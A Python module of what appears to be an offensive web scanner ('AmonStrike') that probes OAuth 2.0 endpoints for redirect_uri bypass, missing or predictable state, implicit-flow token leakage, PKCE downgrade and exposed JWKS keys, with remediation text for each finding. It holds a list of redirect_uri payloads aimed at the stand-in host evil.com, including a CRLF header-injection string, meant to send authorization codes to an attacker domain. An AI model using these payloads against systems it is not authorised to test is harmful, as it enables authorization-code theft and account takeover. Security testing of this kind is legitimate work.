"""
AmonStrike — OAuth 2.0 Attack Module
OAuth is complex — most apps get it wrong.

Attacks:
  1. redirect_uri manipulation — steal auth codes
  2. State parameter CSRF — missing/weak state
  3. Token leakage in Referer/logs
  4. Authorization code injection
  5. Open redirect via redirect_uri
  6. PKCE bypass
  7. Implicit flow token theft
  8. Account takeover via pre-auth
"""

import re
import time
from urllib.parse import urlparse, urlencode, parse_qs
from .base import BaseModule


class OauthModule(BaseModule):
    NAME        = "oauth"
    DESCRIPTION = "OAuth 2.0 attacks — redirect_uri, state CSRF, token theft"

    def run(self):
        self.log("Testing OAuth 2.0 flows...")
        endpoints = self._find_oauth_endpoints()
        self.info["oauth_endpoints"] = endpoints

        if not endpoints:
            self.log("No OAuth endpoints detected", "~")
            return self.result()

        for ep in endpoints:
            self._test_redirect_uri_bypass(ep)
            self._test_state_csrf(ep)
            self._test_token_in_url(ep)
            self._test_pkce_downgrade(ep)

        self._test_well_known()
        return self.result()

    def _find_oauth_endpoints(self) -> list:
        paths = [
            "/oauth/authorize", "/oauth2/authorize",
            "/authorize", "/auth/authorize",
            "/connect/authorize", "/api/oauth/authorize",
            "/oauth/token", "/oauth2/token",
            "/login/oauth/authorize",
            "/.well-known/openid-configuration",
        ]
        found = []
        for path in paths:
            r = self.get(path)
            if r and r.status_code in [200, 302, 400]:
                found.append(self.url + path)
        return found

    def _test_redirect_uri_bypass(self, endpoint: str):
        parsed  = urlparse(self.url)
        host    = parsed.hostname or "target.com"
        scheme  = parsed.scheme

        # Payloads that try to redirect code to attacker
        bypasses = [
            f"https://evil.com",
            f"https://evil.com@{host}",
            f"https://{host}.evil.com",
            f"https://{host}%60.evil.com",
            f"https://evil.com/{host}",
            f"https://{host}/../../../evil.com",
            f"{scheme}://{host}%0d%0aHost: evil.com",
            f"https://evil.com%23{host}",
        ]

        for redirect in bypasses:
            params = {
                "client_id":     "test",
                "redirect_uri":  redirect,
                "response_type": "code",
                "scope":         "openid profile",
                "state":         "teststate",
            }
            try:
                r = self.session.get(
                    endpoint, params=params,
                    timeout=10, allow_redirects=False
                )
                if r and r.status_code in [302, 303]:
                    loc = r.headers.get("Location","")
                    if "evil.com" in loc and "code=" in loc:
                        self.add_finding(
                            title=f"OAuth redirect_uri Bypass — Auth Code Theft",
                            severity="CRITICAL",
                            description=f"OAuth redirect_uri validation can be bypassed with '{redirect}'. Authorization codes (and implicit flow tokens) redirect to attacker domain.",
                            evidence=f"Payload: redirect_uri={redirect}\nLocation header: {loc[:200]}",
                            remediation="Implement strict redirect_uri comparison. Use allowlist of exact URIs. Reject subdomain variations, path traversal, encoded characters.",
                            url=endpoint, cve="CWE-601"
                        )
                        break
            except Exception:
                pass

    def _test_state_csrf(self, endpoint: str):
        # Test 1: Missing state parameter
        params = {
            "client_id":     "test",
            "redirect_uri":  f"{self.url}/callback",
            "response_type": "code",
            "scope":         "openid",
        }
        try:
            r = self.session.get(
                endpoint, params=params,
                timeout=10, allow_redirects=False
            )
            if r and r.status_code in [200, 302]:
                loc = r.headers.get("Location","")
                if "code=" in loc and "state=" not in loc:
                    self.add_finding(
                        title="OAuth Missing State Parameter — CSRF Possible",
                        severity="HIGH",
                        description="OAuth flow completes without a state parameter. Allows CSRF attack to link victim's account to attacker's identity.",
                        evidence=f"Authorization request without state: {params}\nServer accepted without error",
                        remediation="Always require and validate state parameter. Use cryptographically random state tied to user session.",
                        url=endpoint, cve="CWE-352"
                    )
        except Exception:
            pass

        # Test 2: Predictable/empty state
        for state in ["0", "1", "state", "test", "csrf", ""]:
            params["state"] = state
            try:
                r = self.session.get(
                    endpoint, params=params,
                    timeout=10, allow_redirects=False
                )
                if r and r.status_code in [200, 302]:
                    loc = r.headers.get("Location","")
                    if "code=" in loc:
                        self.add_finding(
                            title=f"OAuth Accepts Predictable State Value: '{state}'",
                            severity="MEDIUM",
                            description="OAuth accepts trivially predictable state values, weakening CSRF protection.",
                            evidence=f"state={state!r} was accepted",
                            remediation="Validate state is ≥128 bits of cryptographic randomness and matches the session.",
                            url=endpoint, cve="CWE-352"
                        )
                        break
            except Exception:
                pass

    def _test_token_in_url(self, endpoint: str):
        """Check if tokens appear in URLs (implicit flow risk)."""
        # Try implicit flow
        params = {
            "client_id":     "test",
            "redirect_uri":  f"{self.url}/callback",
            "response_type": "token",
            "scope":         "openid",
            "state":         "state123",
        }
        try:
            r = self.session.get(
                endpoint, params=params,
                timeout=10, allow_redirects=False
            )
            if r:
                loc = r.headers.get("Location","")
                if "access_token=" in loc or "#token=" in loc:
                    self.add_finding(
                        title="OAuth Implicit Flow — Token in URL Fragment",
                        severity="HIGH",
                        description="OAuth uses implicit flow, returning access tokens in URL fragments. Tokens leak in Referer headers, server logs, and browser history.",
                        evidence=f"response_type=token accepted\nToken in Location: {loc[:100]}...",
                        remediation="Use Authorization Code flow with PKCE instead of implicit flow. Never put tokens in URL query strings.",
                        url=endpoint, cve="CWE-200"
                    )
        except Exception:
            pass

    def _test_pkce_downgrade(self, endpoint: str):
        """Test if PKCE can be downgraded (omitted)."""
        params_with_pkce = {
            "client_id":             "test",
            "redirect_uri":          f"{self.url}/callback",
            "response_type":         "code",
            "code_challenge":        "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
            "code_challenge_method": "S256",
            "state":                 "state123",
        }
        params_no_pkce = {
            "client_id":     "test",
            "redirect_uri":  f"{self.url}/callback",
            "response_type": "code",
            "state":         "state123",
        }
        try:
            r1 = self.session.get(endpoint, params=params_with_pkce, timeout=10, allow_redirects=False)
            r2 = self.session.get(endpoint, params=params_no_pkce, timeout=10, allow_redirects=False)
            if (r1 and r2 and
                r1.status_code in [200,302] and
                r2.status_code in [200,302]):
                self.add_finding(
                    title="OAuth PKCE Not Enforced — Authorization Code Interception",
                    severity="HIGH",
                    description="Server accepts authorization requests without PKCE code_challenge. Authorization codes can be intercepted and exchanged by attackers.",
                    evidence="Request without code_challenge accepted same as with PKCE.",
                    remediation="Enforce PKCE for all public clients. Reject requests without code_challenge.",
                    url=endpoint, cve="CWE-330"
                )
        except Exception:
            pass

    def _test_well_known(self):
        """Check OpenID Connect discovery for misconfigurations."""
        paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
        ]
        for path in paths:
            r = self.get(path)
            if not r or r.status_code != 200:
                continue
            try:
                config = r.json()
                # Check for implicit flow support (deprecated, insecure)
                grant_types = config.get("grant_types_supported",[])
                resp_types  = config.get("response_types_supported",[])
                if "implicit" in grant_types or "token" in str(resp_types):
                    self.add_finding(
                        title="OAuth Server Supports Deprecated Implicit Flow",
                        severity="MEDIUM",
                        description="OpenID discovery document advertises implicit flow support, enabling token-in-URL attacks.",
                        evidence=f"grant_types_supported: {grant_types}\nresponse_types_supported: {resp_types}",
                        remediation="Remove implicit flow from supported grant types.",
                        url=self.url+path, cve="CWE-200"
                    )
                # Check JWKS endpoint
                jwks_uri = config.get("jwks_uri","")
                if jwks_uri:
                    jwks_r = self.session.get(jwks_uri, timeout=10)
                    if jwks_r and jwks_r.status_code == 200 and "keys" in jwks_r.text:
                        self.add_finding(
                            title="OAuth Public Keys Exposed (JWKS Endpoint)",
                            severity="INFO",
                            description="Public JWKS endpoint is accessible. Note: this is expected, but enables RS256→HS256 algorithm confusion attacks if the server doesn't pin algorithms.",
                            evidence=f"JWKS URI: {jwks_uri}\nKeys accessible publicly",
                            remediation="Ensure algorithm is strictly pinned server-side. Reject HS256 when expecting RS256.",
                            url=jwks_uri, cve="CWE-347"
                        )
            except Exception:
                pass
